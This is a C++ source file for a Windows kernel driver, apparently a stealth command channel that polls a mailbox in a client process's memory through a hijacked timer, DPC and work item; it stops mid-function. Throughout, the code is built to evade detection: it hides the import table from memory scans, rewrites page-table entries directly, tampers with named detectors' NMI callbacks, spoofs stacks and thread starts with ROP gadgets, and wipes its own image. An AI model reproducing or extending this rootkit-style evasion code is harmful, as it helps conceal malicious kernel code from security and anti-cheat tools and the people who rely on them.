// Postbox command channel: a timer DPC queues a work item; the work item polls a
// mailbox in the client's private memory. No section, handle, named object, or
// dedicated thread. Included only when POSTBOX_CHANNEL is defined; the job-only
// build uses PostboxJobShared.cpp + PostboxJob.cpp.
//
// Threat model and residual artifacts: out/research/AC-25_channel.md.
#ifdef POSTBOX_CHANNEL

#include "../Common/Postbox.h"
#include "../Common/PostboxCrypto.h"

// Minimal kernel layouts, kept local so the channel does not depend on the vendor headers
// declaring these types. Sizes are the x64 Windows 10 layouts; the static_asserts catch a
// header change at compile time.
struct PostboxTimer
{
    _DISPATCHER_HEADER Header;          // 0x00, 0x18 bytes
    uint64_t DueTime;                   // 0x18
    _LIST_ENTRY TimerListEntry;         // 0x20
    void* Dpc;                          // 0x30
    uint32_t Processor;                 // 0x38
    uint32_t Period;                    // 0x3c
};
static_assert(sizeof(PostboxTimer) == 0x40, "KTIMER layout changed");

struct PostboxDpc
{
    uint32_t TargetInfo;                // 0x00
    _SINGLE_LIST_ENTRY DpcListEntry;    // 0x08
    uint64_t ProcessorHistory;          // 0x10
    void* DeferredRoutine;              // 0x18
    void* DeferredContext;              // 0x20
    void* SystemArgument1;              // 0x28
    void* SystemArgument2;              // 0x30
    void* DpcData;                      // 0x38
};
static_assert(sizeof(PostboxDpc) == 0x40, "KDPC layout changed");
static_assert(offsetof(PostboxDpc, DeferredRoutine) == 0x18, "KDPC DeferredRoutine offset changed");
static_assert(offsetof(PostboxDpc, DpcData) == 0x38, "KDPC DpcData offset changed");

struct PostboxWork
{
    _LIST_ENTRY List;                   // 0x00
    void* WorkerRoutine;                // 0x10
    void* Parameter;                    // 0x18
};
static_assert(sizeof(PostboxWork) == 0x20, "WORK_QUEUE_ITEM layout changed");

// Exact-entry event-thread start context for nt!KiUmsRestoreUch. The function
// copies Copy[0..1] to the thread InitialStack (count bytes, backwards),
// switches RSP to InitialStack-0x110, and jumps to Target. Copy[1] is the
// PsTerminateSystemThread return address consumed by the reaper's tail jump.
struct PostboxStartSwitch
{
    uint64_t Copy[2];                   // 0x00
    uint8_t Pad0[0x10];                 // 0x10
    void* Source;                       // 0x20: &Copy[2] (reads Copy[1], Copy[0])
    uint8_t Pad1[0x8];                  // 0x28
    uint64_t Count;                     // 0x30: 16
    uint64_t Target;                    // 0x38: PostboxEventStackEntry
};
static_assert(sizeof(PostboxStartSwitch) == 0x40, "start switch layout changed");
static_assert(offsetof(PostboxStartSwitch, Source) == 0x20, "start switch source moved");
static_assert(offsetof(PostboxStartSwitch, Count) == 0x30, "start switch count moved");
static_assert(offsetof(PostboxStartSwitch, Target) == 0x38, "start switch target moved");

// Detached work-item context. The WORK_QUEUE_ITEM lives in a normal
// nonpaged pool block, not the state page. The DPC routine is the real nt
// PfSnPowerBoostDpc, which queues the item at DeferredContext+0x88; the item's
// WorkerRoutine is an nt `jmp [rcx]` thunk and [Context] is the mapped entry.
// The timer/DPC stay in the same block, after the work item.
struct PostboxWorkContext
{
    uint64_t Entry;                     // 0x00: nt work thunk target
    void* Process;                      // 0x08: cached mailbox EPROCESS
    uint8_t* Stage;                     // 0x10: independent NX stage
    uint64_t StageIndependent;          // 0x18
    uint64_t ImportBase;                // 0x20: nt base for the RVA import table
    void* Event;                        // 0x28: referenced client KEVENT
    uint64_t EventThread;               // 0x30: event thread active
    uint64_t EventEntry;                // 0x38: mapped event-thread entry
    PostboxStartSwitch StartSwitch;     // 0x40: exact-entry start context
    uint64_t EventIsClient;             // 0x80: Event must be dereferenced
    PostboxWork QueueWork;              // 0x88: item queued by PfSnPowerBoostDpc
    PostboxTimer Timer;                 // 0xA8: KTIMER, same pool block
    PostboxDpc Dpc;                     // 0xE8: KDPC, same pool block
};
static_assert(offsetof(PostboxWorkContext, QueueWork) == 0x88,
              "work context queue item moved");
static_assert(offsetof(PostboxWorkContext, Timer) == 0xA8,
              "work context timer moved");
static_assert(offsetof(PostboxWorkContext, Dpc) == 0xE8,
              "work context DPC moved");
static_assert(sizeof(PostboxWorkContext) == 0x128, "work context layout changed");

using FnKeInitializeTimerEx = void (*)(PostboxTimer*, int32_t);
using FnKeInitializeDpc = void (*)(PostboxDpc*, void (*)(void*, void*, void*, void*), void*);
using FnKeSetCoalescableTimer = uint32_t (*)(PostboxTimer*, _LARGE_INTEGER, uint32_t, uint32_t, PostboxDpc*);
using FnKeCancelTimer = uint8_t (*)(PostboxTimer*);
using FnKeFlushQueuedDpcs = void (*)();
using FnPsLookupProcessByProcessId = int32_t (*)(void*, void**);
using FnObDereferenceObject = void (*)(void*);
using FnKeDelayExecutionThread = int32_t (*)(int32_t, uint8_t, _LARGE_INTEGER*);
using FnKeStackAttachProcess = void (*)(void*, void*);      // PEPROCESS, PKAPC_STATE
using FnKeUnstackDetachProcess = void (*)(void*);           // PKAPC_STATE
using FnPsAcquireProcessExitSynchronization = int32_t (*)(void*);
using FnPsReleaseProcessExitSynchronization = void (*)(void*);
using FnKeWaitForSingleObject = int32_t (*)(void*, int32_t, int32_t, uint8_t, void*);
using FnObReferenceObjectByHandle = int32_t (*)(void*, uint32_t, void*, int32_t, void**, void*);
using FnPsCreateSystemThreadEvent = int32_t (*)(void**, uint32_t, void*, void*, void*, void*, void*);
using FnZwCloseEvent = int32_t (*)(void*);

// KAPC_STATE is 0x40 bytes on x64; KeStackAttachProcess writes it and
// KeUnstackDetachProcess reads it back. Keep it 8-aligned on the worker stack.
struct PostboxApcState { uint64_t Opaque[8]; };
static_assert(sizeof(PostboxApcState) == 0x40, "KAPC_STATE size changed");
using FnPsGetProcessCreateTimeQuadPart = int64_t (*)(void*);
using FnPsGetCurrentProcess = void* (*)();
using FnExAllocatePoolWithTag = void* (*)(uint32_t, size_t, uint32_t);
using FnExFreePool = void (*)(void*);
using FnKeEnterCriticalRegion = void (*)();
using FnKeLeaveCriticalRegion = void (*)();
using FnMmAllocateIndependentPages = void* (*)(size_t Size, uint32_t Arg2,
                                               uint32_t Arg3, uint32_t Arg4);
using FnMmSetPageProtection = uint8_t (*)(void* Addr, size_t Size, uint32_t Protect);
using FnMmFreeIndependentPages = void (*)(void* Addr, size_t Size);

using FnMmCopyVirtualMemory = int32_t (*)(void* SourceProcess, void* SourceAddress,
                                          void* TargetProcess, void* TargetAddress,
                                          size_t Size, int32_t PreviousMode, size_t* Done);
using FnKeIpiGenericCall = uint64_t (*)(uint64_t (*)(uint64_t), uint64_t);
using FnKeQueryInterruptTime = uint64_t (*)(uint64_t* PerformanceCounter);
#ifdef POSTBOX_KEEP_THREAD_SPOOF
using FnPsLookupThreadByThreadId = int32_t (*)(void* ThreadId, void** Thread);
using FnPsCreateSystemThread = int32_t (*)(void** ThreadHandle, uint32_t DesiredAccess,
                                           void* ObjectAttributes, void* ProcessHandle,
                                           void* ClientId, void* StartRoutine,
                                           void* StartContext);
using FnZwClose = int32_t (*)(void* Handle);
#endif

static address g_KeInitializeTimerEx_Raw = 0;
static address g_KeInitializeDpc_Raw = 0;
static address g_KeSetCoalescableTimer_Raw = 0;
static address g_KeCancelTimer_Raw = 0;
static address g_KeFlushQueuedDpcs_Raw = 0;
static address g_ExQueueWorkItem_Raw = 0;
static address g_PsLookupProcessByProcessId_Raw = 0;
static address g_ObDereferenceObject_Raw = 0;
static address g_KeDelayExecutionThread_Raw = 0;
static address g_PsAcquireProcessExitSynchronization_Raw = 0;
static address g_PsReleaseProcessExitSynchronization_Raw = 0;
static address g_KeStackAttachProcess_Raw = 0;
static address g_KeUnstackDetachProcess_Raw = 0;
static address g_KeWaitForSingleObject_Raw = 0;
static address g_ObReferenceObjectByHandle_Raw = 0;
static address g_PsCreateSystemThreadEvent_Raw = 0;
static address g_ZwCloseEvent_Raw = 0;
static address g_ExEventObjectType_Raw = 0;
static address g_PsTerminateSystemThread_Raw = 0;
static address g_PsGetProcessCreateTimeQuadPart_Raw = 0;
static address g_PsGetCurrentProcess_Raw = 0;
static address g_ExAllocatePoolWithTag_Raw = 0;
static address g_ExFreePool_Raw = 0;
// Staging slots for the three independent-page helpers. PostboxStart fills them
// from the loader config, moves them into PostboxState.Imports as soon as the
// state page exists, and zeroes them. No later path reads these.
static address g_MmAllocateIndependentPages_Raw = 0;
static address g_MmSetPageProtection_Raw = 0;
static address g_MmFreeIndependentPages_Raw = 0;
static address g_KeEnterCriticalRegion_Raw = 0;
static address g_KeLeaveCriticalRegion_Raw = 0;
static address g_KeQueryInterruptTime_Raw = 0;

static address g_MmCopyVirtualMemory_Raw = 0;
#ifdef POSTBOX_KEEP_THREAD_SPOOF
// Thread-spoof path; POSTBOX_KEEP_THREAD_SPOOF builds only.
static address g_PsCreateSystemThread_Raw = 0;
static address g_ZwClose_Raw = 0;
static address g_PsLookupThreadByThreadId_Raw = 0;
#endif

static volatile long PostboxRunning = 0;
// Cleared by the assembly worker wrapper after PostboxWorkRoutine returns, so
// the reaper cannot free the image while the C worker is still in its epilogue.
extern "C" volatile long PostboxInFlight = 0;
// Set by PostboxStartReaper when the worker's terminal path must free the state
// page/image. The assembly epilogue consumes it after the worker routine returns.
extern "C" volatile long PostboxTeardownPending = 0;
static volatile long PostboxTeardown = 0;
static volatile long PostboxReaperStarted = 0;

// The reaper stub is assembly in PostboxReaper.S. It runs as a system thread,
// waits for the work routine to return, frees the state page, then tail-jumps to
// MmFreeIndependentPages so the free returns to PspSystemThreadStartup. The
// thread's StartContext is the state page; the image range and free routine are
// read from it before the page is wiped, so no reaper context lives in .data.
struct PostboxState;
struct PostboxReaperPlan
{
    uint64_t Base;
    uint64_t Size;
    uint64_t Free;
};
extern "C" void PostboxReaperEntry();
extern "C" uint64_t PostboxReaperPrepare(PostboxState* State, PostboxReaperPlan* Plan);
// Assembly worker wrapper: calls PostboxWorkRoutine, then clears PostboxInFlight
// after the C worker has returned. Only the wrapper's add/ret remain in image
// code when the reaper sees InFlight == 0.
extern "C" void PostboxWorkEntry();
extern "C" void PostboxWorkRoutine(void*);

// Resolved ntoskrnl routines used after the state page exists. They are copied
// out of .data into the state page by PostboxStart and zeroed in .data, so a
// static .data scan sees no routine table. KeIpiGenericCall stays in .data: the
// pre-start ProtectImageSections path needs it before the state page exists. The
// three independent-page helpers are staged in .data only long enough to create
// and protect the state page, then they move here too.
struct PostboxImports
{
    uint32_t KeInitializeTimerEx;
    uint32_t KeInitializeDpc;
    uint32_t KeSetCoalescableTimer;
    uint32_t KeCancelTimer;
    uint32_t KeFlushQueuedDpcs;
    uint32_t ExQueueWorkItem;
    uint32_t PsLookupProcessByProcessId;
    uint32_t ObDereferenceObject;
    uint32_t KeDelayExecutionThread;
    uint32_t PsGetProcessCreateTimeQuadPart;
    uint32_t ExAllocatePoolWithTag;
    uint32_t ExFreePool;
    uint32_t MmCopyVirtualMemory;
    uint32_t PsGetCurrentProcess;
    uint32_t PsAcquireProcessExitSynchronization;
    uint32_t PsReleaseProcessExitSynchronization;
    uint32_t PsCreateSystemThread;
    uint32_t ZwClose;
    uint32_t MmAllocateIndependentPages;
    uint32_t MmSetPageProtection;
    uint32_t MmFreeIndependentPages;
    // Kernel APCs stay disabled for the mapped worker step; the worker also
    // uses KeQueryInterruptTimePrecise for the 1 s NMI refresh deadline.
    uint32_t KeEnterCriticalRegion;
    uint32_t KeLeaveCriticalRegion;
    uint32_t PsLookupThreadByThreadId;
    uint32_t KeQueryInterruptTime;
    uint32_t KeStackAttachProcess;
    uint32_t KeUnstackDetachProcess;
    // Event-driven trigger.
    uint32_t KeWaitForSingleObject;
    uint32_t ObReferenceObjectByHandle;
    uint32_t PsCreateSystemThreadEvent;
    uint32_t ZwCloseEvent;
    uint32_t ExEventObjectType;
    uint32_t PsTerminateSystemThread;
};

#ifdef POSTBOX_KEEP_THREAD_SPOOF
[[maybe_unused]] static void PostboxSpoofThreadStart(void* ThreadId);
#endif

// NMI-gate imports. Kept in the state page so the NMI build's .data does not
// carry thirteen ntoskrnl routine pointers. PostboxNmiInstall runs after the
// state page exists; PostboxNmiUninstall runs before the page is freed.
struct PostboxNmiImports
{
    uint64_t KeQueryActiveProcessors;
    uint64_t KeQueryActiveProcessorCountEx;
    uint64_t KeSetSystemAffinityThreadEx;
    uint64_t KeRevertToUserAffinityThreadEx;
    uint64_t KeGetCurrentProcessorNumberEx;
    uint64_t KeStallExecutionProcessor;
    uint64_t MmMapIoSpace;
    uint64_t MmUnmapIoSpace;
    // Accounted-NMI storm: HalSendNMI marks the NMI so the Windows handler
    // recognizes it (a raw self-IPI chains into NMI_HARDWARE_FAILURE 0x80).
    uint64_t HalSendNMI;
    uint64_t KeInitializeAffinityEx;
    uint64_t KeAddProcessorAffinityEx;
    uint64_t KeRegisterNmiCallback;
    uint64_t KeDeregisterNmiCallback;
};

#ifdef E3_DPC_PROBE
// E3 probe result (E3_DPC_PROBE builds). Appended to PostboxState so the default
// layout is unchanged; KD reads it at state+0x308. Magic is "E3TLB001".
struct PostboxE3Result
{
    uint64_t Magic;
    uint64_t Va;
    uint64_t PteBefore;
    uint64_t PteAfter;
    uint64_t Pre;       // CPU-1 read before the PTE change
    uint64_t P1;        // CPU-1 read after the PTE change, before the flush
    uint64_t P2;        // CPU-1 read after the KeIpiGenericCall flush
    uint64_t Cpu1;
    uint64_t Cpu2;
    uint64_t Phase;     // 0x100 complete; 0xE0..0xEC failure
};
#endif

#ifdef NMI_SANITIZE
// Callback-list state. The list entry layout is fixed by nt!KiRegisterNmiSxCallback:
// [0] next, [8] callback, [0x10] context, [0x18] handle. The detector's context is
// an array of 0x18-byte NMI_CONTEXT records (rip, rsp, count, user).
struct PostboxDetectorNmiContext
{
    uint64_t Rip;
    uint64_t Rsp;
    uint32_t Count;
    uint8_t User;
    uint8_t Pad[3];
};
static_assert(sizeof(PostboxDetectorNmiContext) == 0x18, "detector NMI context changed");

struct PostboxNmiSanitizeState
{
    uint64_t Handle;
    uint64_t ListHead;
    uint64_t ImageBase;
    uint64_t ImageSize;
    uint64_t NtBase;
    uint64_t NtSize;
    uint64_t RetGadget;
    uint64_t PopRspRet;
    uint64_t PopRspRetSkip;
    uint64_t ShadowJumpGadget;
    uint64_t DetectorBase;
    uint64_t DetectorSize;
    uint64_t Register;
    uint64_t Deregister;
    uint64_t GetProc;
    uint32_t Active;
    uint32_t DetectorKind;   // 1 = nmi-callback-handler, 2 = unKover
    // N-10: the sanitizer can be ready but inactive when the detector is not
    // loaded yet. PostboxWorkRoutine retries activation and refreshes the
    // detector range on a 1 s deadline. No dedicated thread exists.
    uint32_t Ready;
    uint32_t Reserved;
    uint64_t RefreshDeadline;
#ifdef NMI_PROBE
    // Test-only evidence block for the pb_nmi_status command. Not in the
    // shipped layout (NMI_PROBE is off in the product).
    uint64_t Writes;
    uint64_t ApcNeutralized;
    uint64_t ThreadStartSpoofed;
    uint64_t LastCount;
    uint64_t LastUser;
    uint64_t LastCore;
    uint64_t LastRip;
    uint64_t LastRsp;
    uint64_t RefreshCount;
#endif
};
#endif

#if defined(STACK_SPOOF) && defined(POSTBOX_KEEP_THREAD_SPOOF)
// Test-only APC-stackwalk thread-loop context. The zero-thread product path
// does not compile this layout.
struct PostboxThreadLoopContext
{
    uint64_t State;
    uint64_t Step;
    uint64_t WaitTarget;
    int64_t WaitInterval;
    uint64_t EnterCritical;
    uint64_t LeaveCritical;
};
static_assert(offsetof(PostboxThreadLoopContext, State) == 0x00,
              "PostboxThreadLoop context layout changed");
static_assert(offsetof(PostboxThreadLoopContext, Step) == 0x08,
              "PostboxThreadLoop context layout changed");
static_assert(offsetof(PostboxThreadLoopContext, WaitTarget) == 0x10,
              "PostboxThreadLoop context layout changed");
static_assert(offsetof(PostboxThreadLoopContext, WaitInterval) == 0x18,
              "PostboxThreadLoop context layout changed");
static_assert(offsetof(PostboxThreadLoopContext, EnterCritical) == 0x20,
              "PostboxThreadLoop context layout changed");
static_assert(offsetof(PostboxThreadLoopContext, LeaveCritical) == 0x28,
              "PostboxThreadLoop context layout changed");
static_assert(sizeof(PostboxThreadLoopContext) == 0x30,
              "PostboxThreadLoop context size changed");
#endif

// The live protocol state (config, keys, timer/DPC/work, client EPROCESS, stage)
// lives on a separate independent RW/NX page. Only this pointer stays in .data.
struct PostboxState
{
    PostboxConfig Cfg;
    pb::PostboxKeys Keys;
    // The KFWk context (entry/process/stage/import base/work item/timer/DPC)
    // lives in the second page of this independent allocation at State+0x1000;
    // no pointer to it is stored here. The pad preserves the historical
    // state-page offsets (E3 is pinned at 0x308).
    uint8_t CtxPad[0x88];
    uint64_t WorkJump;
    void* Process;
    uint8_t* Stage;
    uint64_t SessionId;
    uint64_t LastNonce;
    uint32_t LastSeq;
    uint32_t AuthFailures;
    bool StageIndependent;
    PostboxImports Imports;
    // one nt-base anchor for the 32-bit RVA import table. Kept outside
    // Caches so the reaper can still resolve teardown helpers after
    // PostboxFreeState wipes the cache copies. The pads preserve the historical
    // state-page offsets, including E3 at 0x308.
    uint32_t ImportsPad0;
    uint64_t ImportBase;
    uint8_t ImportsPad1[0x38];   // keeps E3 at 0x308 after the event imports
    // Loader allocation passed to the reaper. Kept in the state page, not .data,
    // so the image base/size do not reappear in the resident image during stop.
    uint64_t ReaperBase;
    uint64_t ReaperSize;
    // B-01: the only config value the poll needs. Kept outside the Cfg copy so
    // the whole PostboxConfig can be wiped once start has consumed Pid/CreateTime.
    // Appended after the reaper fields so every existing state offset is stable.
    uint64_t MailboxVa;
    // C-01: ntoskrnl/PTE-base/PfnDatabase bases live here, not in .data. The
    // pre-protection path uses Mem.cpp's transient statics; PostboxStart adopts
    // them into this field and zeroes the statics.
    PostboxMemCaches Caches;
#ifdef E3_DPC_PROBE
    PostboxE3Result E3;
#endif
#ifdef NMI_SANITIZE
    PostboxNmiSanitizeState NmiSanitize;
#endif
#ifdef POSTBOX_NMI
    // Gate imports are only touched by POSTBOX_NMI. Kept last so growing them
    // cannot shift the E3 probe result's fixed KD offset (0x308).
    PostboxNmiImports NmiImports;
#endif
#if defined(STACK_SPOOF) && defined(POSTBOX_KEEP_THREAD_SPOOF)
    // Test-only fallback thread contexts; not present in the stealth image.
    PostboxThreadLoopContext MonitorLoop;
    PostboxThreadLoopContext RefreshLoop;
#endif
};
static_assert(sizeof(PostboxState) <= 0x800, "PostboxState overlaps the fake NMI stack");
#ifdef E3_DPC_PROBE
static_assert(offsetof(PostboxState, E3) == 0x308, "E3 result offset changed");
#endif

// The KFWk context is the second page of the same independent allocation.
static constexpr uint32_t PostboxCtxOffset = 0x1000;
static PostboxWorkContext* PostboxCtx(const PostboxState* S)
{
    if (!S) return nullptr;
    const void* Raw = (const uint8_t*) (uintptr_t) S + PostboxCtxOffset;
    return (PostboxWorkContext*) __builtin_assume_aligned(Raw, 8);
}
static_assert(PostboxCtxOffset >= sizeof(PostboxState), "state/context overlap");

// External linkage: PostboxReaper.S loads this directly on the worker's
// terminal path.
extern "C" PostboxState* PostboxStatePtr = nullptr;
static uint32_t PostboxPollRefs = 0;
static bool PostboxPollTeardown = false;

// Mem.cpp calls this on every lookup. Before the state page exists it returns
// null, so the transient static cache is used; after PostboxStart it returns the
// state-page copy and the statics stay zero.
PostboxMemCaches* PostboxGetMemCaches()
{
    return PostboxStatePtr ? &PostboxStatePtr->Caches : nullptr;
}

// The resident import table stores 32-bit RVAs, not a contiguous array
// of kernel pointers. ImportBase lives in the KFWk block after start; the
// state-page copy is used only during early start and then zeroed.
static uint64_t PostboxImportBase(const PostboxState* S)
{
    if (!S) return 0;
    const PostboxWorkContext* Ctx = PostboxCtx(S);
    if (Ctx && Ctx->ImportBase) return Ctx->ImportBase;
    return S->ImportBase;
}

static uint32_t PostboxRva(address Fn)
{
    const uint64_t Nt = PostboxImportBase(PostboxStatePtr);
    const uint64_t Value = (uint64_t) (uintptr_t) Fn;
    return (Nt && Value >= Nt && Value - Nt <= 0xFFFFFFFFull)
               ? (uint32_t) (Value - Nt) : 0;
}

// Teardown paths exchange PostboxStatePtr to null before they call the saved
// helpers, so they resolve the RVA against the state/Ctx they already own.
static address PostboxImportFrom(const PostboxState* S, uint32_t Rva)
{
    const uint64_t Nt = PostboxImportBase(S);
    return (Rva && Nt) ? (address) (uintptr_t) (Nt + Rva) : (address) 0;
}

static address PostboxImport(uint32_t Rva)
{
    return PostboxImportFrom(PostboxStatePtr, Rva);
}

#define g_KeInitializeTimerEx (PostboxImport(PostboxStatePtr->Imports.KeInitializeTimerEx))
#define g_KeInitializeDpc (PostboxImport(PostboxStatePtr->Imports.KeInitializeDpc))
#define g_KeSetCoalescableTimer (PostboxImport(PostboxStatePtr->Imports.KeSetCoalescableTimer))
#define g_KeCancelTimer (PostboxImport(PostboxStatePtr->Imports.KeCancelTimer))
#define g_KeFlushQueuedDpcs (PostboxImport(PostboxStatePtr->Imports.KeFlushQueuedDpcs))
#define g_PsLookupProcessByProcessId (PostboxImport(PostboxStatePtr->Imports.PsLookupProcessByProcessId))
#define g_ObDereferenceObject (PostboxImport(PostboxStatePtr->Imports.ObDereferenceObject))
#define g_KeDelayExecutionThread (PostboxImport(PostboxStatePtr->Imports.KeDelayExecutionThread))
#define g_PsGetProcessCreateTimeQuadPart (PostboxImport(PostboxStatePtr->Imports.PsGetProcessCreateTimeQuadPart))
#define g_ExAllocatePoolWithTag (PostboxImport(PostboxStatePtr->Imports.ExAllocatePoolWithTag))
#define g_ExFreePool (PostboxImport(PostboxStatePtr->Imports.ExFreePool))
#define g_MmCopyVirtualMemory (PostboxImport(PostboxStatePtr->Imports.MmCopyVirtualMemory))
#define g_PsGetCurrentProcess (PostboxImport(PostboxStatePtr->Imports.PsGetCurrentProcess))
#define g_PsAcquireProcessExitSynchronization (PostboxImport(PostboxStatePtr->Imports.PsAcquireProcessExitSynchronization))
#define g_PsReleaseProcessExitSynchronization (PostboxImport(PostboxStatePtr->Imports.PsReleaseProcessExitSynchronization))
#define g_KeStackAttachProcess (PostboxImport(PostboxStatePtr->Imports.KeStackAttachProcess))
#define g_KeUnstackDetachProcess (PostboxImport(PostboxStatePtr->Imports.KeUnstackDetachProcess))
#define g_KeWaitForSingleObject (PostboxImport(PostboxStatePtr->Imports.KeWaitForSingleObject))
#define g_ObReferenceObjectByHandle (PostboxImport(PostboxStatePtr->Imports.ObReferenceObjectByHandle))
#define g_PsCreateSystemThreadEvent (PostboxImport(PostboxStatePtr->Imports.PsCreateSystemThreadEvent))
#define g_ZwCloseEvent (PostboxImport(PostboxStatePtr->Imports.ZwCloseEvent))
#define g_PsTerminateSystemThread (PostboxImport(PostboxStatePtr->Imports.PsTerminateSystemThread))
#ifdef POSTBOX_KEEP_THREAD_SPOOF
#define g_PsCreateSystemThread (PostboxImport(PostboxStatePtr->Imports.PsCreateSystemThread))
#define g_ZwClose (PostboxImport(PostboxStatePtr->Imports.ZwClose))
#endif
#define g_MmAllocateIndependentPages (PostboxImport(PostboxStatePtr->Imports.MmAllocateIndependentPages))
#define g_MmSetPageProtection (PostboxImport(PostboxStatePtr->Imports.MmSetPageProtection))
#define g_MmFreeIndependentPages (PostboxImport(PostboxStatePtr->Imports.MmFreeIndependentPages))
#ifdef POSTBOX_KEEP_THREAD_SPOOF
#define g_PsLookupThreadByThreadId (PostboxImport(PostboxStatePtr->Imports.PsLookupThreadByThreadId))
#endif
#define g_KeQueryInterruptTime (PostboxImport(PostboxStatePtr->Imports.KeQueryInterruptTime))

#ifdef STACK_SPOOF
// Defined with the stack-spoof assembly and globals below; forward-declared for
// the worker's stack-spoof setup and the preserved thread-loop fallback.
extern "C" uint64_t g_PostboxPopRspRet;
extern "C" uint64_t g_PostboxPopRspRetSkip;
#ifdef POSTBOX_KEEP_THREAD_SPOOF
extern "C" void PostboxThreadLoop();
#endif
#endif

// Defined with the other call-site wrappers below; declared here because the
// test-only NMI probe runs before their definitions.
static void PostboxFreePool(void* Base);
static int32_t PostboxDelayExecutionThread(int32_t WaitMode, uint8_t Alertable,
                                           _LARGE_INTEGER* Interval);

constexpr uint32_t StageBytes = PostboxDataMax;
constexpr uint32_t StageAllocBytes = (StageBytes + 0xFFFu) & ~0xFFFu;
static uint32_t PostboxPeriodMs = 4;
static uint32_t PostboxIdleMs = 0;
static uint32_t PostboxDeadTicks = 0;

// The nt DPC queues the work item directly; the worker re-arms the one-shot
// timer after each poll, so there is no DPC-side re-arm or refcount handshake.

#ifdef POSTBOX_NMI
bool PostboxNmiInstall();
void PostboxNmiUninstall();
bool PostboxNmiSelfTest(uint64_t* Count);
uint64_t PostboxNmiCount();
uint32_t PostboxNmiStorm(uint32_t Count);
#endif

// MmCopyMemory's documented user path bound (PostboxUserLimit) and the config
// validation live in Common/Postbox.h (PostboxConfigValid, host-unit-tested).

// The linker-defined image base. A RIP-relative reference resolves to the runtime
// pool base after the loader applies relocations, so this is the mapped image base.
extern "C" _IMAGE_DOS_HEADER __ImageBase;

static bool PostboxResolve(address* IpiGenericCallOut = nullptr);

// Self-map entry for a VA. The kernel's PTE_BASE maps the page tables, so this
// is a direct kernel VA write with no physical alias and no user-half supervisor
// PTE. Large-page mappings are refused: the image is a page-granular pool block.
static uint64_t* SelfMapEntry(address Va)
{
    const uint64_t PteBase = (uint64_t) GetPteBase();
    if (!PteBase) return nullptr;
    constexpr uint64_t Mask = (1ull << 39) - 8;
    return (uint64_t*) (uintptr_t) (PteBase + (((uint64_t) Va >> 9) & Mask));
}

static bool GetPteForVa(address Va, uint64_t*& Entry)
{
    uint64_t* Pte = SelfMapEntry(Va);
    if (!Pte) return false;
    uint64_t* Pde = SelfMapEntry(address((uint64_t) (uintptr_t) Pte));
    uint64_t* Pdpte = SelfMapEntry(address((uint64_t) (uintptr_t) Pde));
    uint64_t* Pml4e = SelfMapEntry(address((uint64_t) (uintptr_t) Pdpte));
    if (!Pml4e || !Pdpte || !Pde) return false;

    if (!(*Pml4e & 1) || !(*Pdpte & 1) || !(*Pde & 1)) return false;
    if (*Pdpte & (1ull << 7)) return false;       // 1 GB page
    if (*Pde & (1ull << 7)) return false;         // 2 MB page
    if (!(*Pte & 1)) return false;

    Entry = Pte;
    return true;
}

// Set W and NX on one 4 KB image page through the self-map, then invlpg the
// current CPU. ProtectImageSections follows the loop with a global IPI flush.
static bool SetPageProtection(address Va, bool Write, bool Execute)
{
    uint64_t* Entry = nullptr;
    if (!GetPteForVa(Va, Entry)) return false;

    uint64_t Value = *Entry;
    if (Write) Value |= 2;
    else       Value &= ~2ull;
    if (Execute) Value &= ~(1ull << 63);
    else         Value |= (1ull << 63);

    __atomic_store_n(Entry, Value, __ATOMIC_RELEASE);
    invlpg(Va);
    return true;
}

struct PostboxTlbRange
{
    uint64_t Start;
    uint64_t End;
};

// KeIpiGenericCall callback: runs on every CPU at IPI_LEVEL and only invlpg's.
static uint64_t PostboxFlushTlb(uint64_t Context)
{
    const PostboxTlbRange* Range = (const PostboxTlbRange*) (uintptr_t) Context;
    for (uint64_t Va = Range->Start; Va < Range->End; Va += 0x1000)
        invlpg(address(Va));
    return 0;
}

#ifdef T2_PROBE
// Test-only E3 probe. Runs from KeIpiGenericCall on every CPU; only CPU 1
// performs the write. The .text page is RX after the PTE loop; a stale RW TLB
// entry lets the write succeed, otherwise the raw kernel write bugchecks 0xBE.
static uint64_t g_T2GetProcessorNumberEx = 0;

static uint64_t T2ProbeCallback(uint64_t Context)
{
    if (!Context || !g_T2GetProcessorNumberEx) return 0;
    struct { uint16_t Group; uint8_t Number; uint8_t Reserved; } Pn{};
    ((void (*)(void*)) g_T2GetProcessorNumberEx)(&Pn);
    if (Pn.Number != 1) return 0;

    volatile uint8_t* P = (volatile uint8_t*) (uintptr_t) (Context + 0x4FF0);
    const uint8_t Old = *P;
    *P = 0xAA;
    *P = Old;
    return 0;
}

static void T2Probe(uint64_t Base, uint64_t Ipi, uint32_t Phase)
{
    print(INFO("[T2] P%u probe start base=%p"), Phase, (void*) (uintptr_t) Base);
    ((FnKeIpiGenericCall) Ipi)(&T2ProbeCallback, Base);
}
#endif

#ifdef E3_DPC_PROBE
// Test-only E3 CPU-1 stale-TLB probe. Never part of the shipped build.
//
// Two independent pages A and B are filled with 0x41 and 0x42. A's PTE is
// rewritten to B's PFN while CPU 1 still holds the A translation. A DPC targeted
// at CPU 1 records the read before the product KeIpiGenericCall+invlpg flush
// (P1: stale 0x41) and after it (P2: 0x42). The result block lives in the state
// page at +0x308 for KD.
using FnKeSetTargetProcessorDpc = void (*)(PostboxDpc*, uint8_t);
using FnKeInsertQueueDpc = uint8_t (*)(PostboxDpc*, void*, void*);
using FnKeGetCurrentProcessorNumberEx = void (*)(void*);
using FnKeSetSystemAffinityThreadEx = uint64_t (*)(uint64_t);
using FnKeRevertToUserAffinityThreadEx = void (*)(uint64_t);

static PostboxDpc E3Dpc1;
static PostboxDpc E3Dpc2;
static uint64_t* E3Pte = nullptr;
static uint64_t E3PteOld = 0;
static uint64_t E3PteNew = 0;
static uint8_t* E3PageA = nullptr;
static uint8_t* E3PageB = nullptr;
static volatile long E3PhaseDone = 0;
static volatile long E3Started = 0;
static address E3SetTarget = 0;
static address E3InsertDpc = 0;
static address E3GetProc = 0;

static uint32_t E3CurrentProcessor()
{
    struct { uint16_t Group; uint8_t Number; uint8_t Reserved; } Pn{};
    if (E3GetProc) ((FnKeGetCurrentProcessorNumberEx) E3GetProc)(&Pn);
    return Pn.Number;
}

static void E3DpcPhase1(void*, void*, void*, void*)
{
    PostboxState* S = PostboxStatePtr;
    if (!S) return;
    S->E3.Cpu1 = E3CurrentProcessor();
    volatile uint64_t* A = (volatile uint64_t*) (uintptr_t) E3PageA;
    S->E3.Pre = *A;
    __atomic_store_n(E3Pte, E3PteNew, __ATOMIC_RELEASE);
    S->E3.P1 = *A;
    __atomic_store_n(&E3PhaseDone, 1, __ATOMIC_RELEASE);
}

static void E3DpcPhase2(void*, void*, void*, void*)
{
